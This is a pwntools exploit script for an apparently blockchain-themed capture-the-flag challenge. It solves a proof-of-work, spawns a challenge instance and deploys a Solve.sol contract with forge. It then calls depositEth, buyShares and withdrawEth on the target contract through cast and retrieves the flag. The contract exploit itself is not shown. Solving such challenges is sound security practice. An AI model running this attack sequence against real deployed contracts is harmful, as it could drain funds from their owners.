#!/usr/bin/env -S python3 -u
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337
from pwn import *
import re
import subprocess
import hashlib
import random


# Set up pwntools for the correct architecture
context.update(arch='amd64')
# Just set TERM_PROGRAM in your ~/.profile!
# context.update(terminal='CHANGEME')
#exe = context.binary = ELF(args.EXE or 'challenge')
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
# fake_flag = open("./flag-fake.txt", "r").readline().strip()
def find_flag(output):
    info(output)
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    # if fake_flag in output:
    #     return fake_flag

    # Match possible local flag
    # with open("/flag.txt", "r") as local:
    #     locl_flag = local.readline().strip()
    #     if locl_flag in output:
    #         return locl_flag
    
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None

# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")
def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    None
    #if args.GDB:
    #    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    #else:
    #    return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def solve_pow():
    print("Finding ticket .... ", end="", flush=True)

    x = 100000000 + random.randint(0, 200000000000)

    for i in range(x, x + 20000000000):
        m = hashlib.sha256()
        ticket = str(i)
        m.update(ticket.encode('ascii'))
        digest1 = m.digest()
        m = hashlib.sha256()
        m.update(digest1 + ticket.encode('ascii'))
        if m.hexdigest().startswith('0000000'):
            print("Finished!")
            print(f"Ticket found: {i}")
            return i


def spawn_instance():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Ticket: ", pow_)

    io.recvuntil(b"Endpoint:")
    RPC = io.recvline().strip()
    PC = io.recvline().split(b"key:")[1].strip()
    SC = io.recvline().split(b"contract:")[1].strip()

    return (RPC.decode(), PC.decode(), SC.decode())

def kill_instance():
    try:
        io.close() # we get a fresh instance -> less error-prone
    except:
        pass

    io = start()
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(B"Ticket:", pow_)
    io.close()

def get_flag():
    try:
        io.close()
    except:
        pass

    io = start()
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Ticket: ", pow_)
    flag = io.recvall(timeout=3)
    return flag


def solve_challenge(RPC, PC, SC):
    TC = "0x" + subprocess.run(f'cast call --rpc-url={RPC} {SC} "TARGET()"', shell=True, capture_output=True).stdout[26:].decode().strip() # gets only the 20 bytes address
    info(f"{TC = }")
    
    SB = "0x" + subprocess.run(f'cast call --rpc-url={RPC} {SC} "SB()"', shell=True, capture_output=True).stdout[26:].decode().strip() # gets only the 20 bytes address
    info(f"{SB = }")

    subprocess.run(f'forge create --constructor-args={TC} --private-key={PC} --rpc-url={RPC} --value=100000000000000000000 Solve.sol:Solve', shell=True, capture_output=True)

    subprocess.run(f'cast send --private-key={PC} --rpc-url={RPC} --value=1 {TC} "depositEth()"', shell=True, capture_output=True)
    
    subprocess.run(f'cast send --private-key={PC} --rpc-url={RPC} {SB} "buyShares()"', shell=True, capture_output=True)
    
    withdrawnLog = subprocess.run(f'cast send --private-key={PC} --rpc-url={RPC} {TC} "withdrawEth(uint256)" 1', shell=True, capture_output=True)
    # info(f"{withdrawnLog = }")



# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def execute():
    RPC, PC, SC = spawn_instance()

    info(f"{RPC = }")
    info(f"{PC = }")
    info(f"{SC = }")

    solve_challenge(RPC, PC, SC)

    flag_buffer = get_flag()

    f = find_flag(flag_buffer)

    kill_instance()

    if f is not None:
        log.success(f)
        exit(0)
    else:
        # Remember to return nonzero if something failed
        exit(1)

    #io.interactive()

try:
    pow_ = b"41448623920"
    # pow_ = b""
    io = start()
    execute()
except:
    kill_instance()